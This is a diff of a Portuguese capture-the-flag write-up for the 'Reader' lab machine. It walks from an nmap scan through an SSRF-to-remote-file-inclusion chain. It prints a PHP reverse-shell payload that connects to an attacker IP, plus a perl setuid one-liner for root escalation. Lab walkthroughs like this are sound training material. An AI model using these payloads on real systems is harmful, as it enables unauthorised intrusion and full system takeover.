@@ -1,12 +1,13 @@
 ---
 title: 'Reader Writeup'
 date: '2024-06-29'
-tags: ['SSRF','RFI']
+tags: ['SSRF', 'RFI', 'Linux']
 draft: false
 summary: 'Writeup do CTF Reader da Hacking Club.'
 images: ['/static/images/writeup-reader-images/logo-reader.png']
 authors: ['default']
 ---
+
 ![Logo Reader](/static/images/writeup-reader-images/logo-reader.png)
 
 ## **Plataforma**: Hacking Club
@@ -17,16 +18,16 @@ authors: ['default']
 
 ### IP: 172.16.4.104
 
-**Gabriel Silva | 29 de junho, 2024**
-
 ---
 
-### **Port Scanning**
+### Port Scanning
+
+`nmap -sV -sC -p- -v $IP --open`
 
 ```bash
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   256 1b:6f:d9:6f:08:c8:eb:59:76:5f:fe:f5:1f:28:b4:d2 (ECDSA)
 | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCdE/+UDioqJcBqKEjyENBihhOMB9Ocue8I+pDmGchJZvrGwO2MbIiL6VLH+bqm08nrq+NdjzWM7TewudhK9viM=
 |   256 81:51:ba:61:11:db:07:50:51:66:92:d8:e1:ff:68:36 (ED25519)
@@ -34,7 +35,7 @@ PORT   STATE SERVICE REASON  VERSION
 80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
 |_http-server-header: Apache/2.4.52 (Ubuntu)
 |_http-title: Emergency Maintenance
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
@@ -77,7 +78,6 @@ Por alguma razão pelo burp não esta funcionando passar o parâmetro , mas via 
 
 ![Curl POST](/static/images/writeup-reader-images/4.png)
 `curl -X POST <http://172.16.4.104/api.php> -d "url=http://127.0.0.1"`
-
 
 Ele está salvando a requisição em algum lugar no arquivo .txt (Salvo em /logfiles/ achado via gobuster).
 ![Curl resposta](/static/images/writeup-reader-images/curl-1.png)Como o parâmetro se chama `url` podemos deduzir que se trata de um SSRF.
@@ -122,16 +122,20 @@ Lembrando que é necessário converter pra base64 , por que se não a aplicaçã
 #shell.php
 <?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.0.31.150/1337 0>&1'"); ?>
 ```
+
 ![Python server](/static/images/writeup-reader-images/python-m-http-server.png)
 
 Agora é so mandar a requisição pro servidor.
 `curl -X POST <http://172.16.4.104/api.php> -d "url=http://127.0.0.1:8080/read.php?file=http://10.0.31.150:80/shell.php"`
 ![Foothold](/static/images/writeup-reader-images/foothold.png)
+
 ## Privilege Escalation
 
 `getcap -r / 2>/dev/null`
 ![Privesc 1](/static/images/writeup-reader-images/privesc-1.png)
 `/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";’`
 ![Privesc 2](/static/images/writeup-reader-images/privesc-2.png)
+
 ## Proof
+
 ![Proof](/static/images/writeup-reader-images/proof.png)
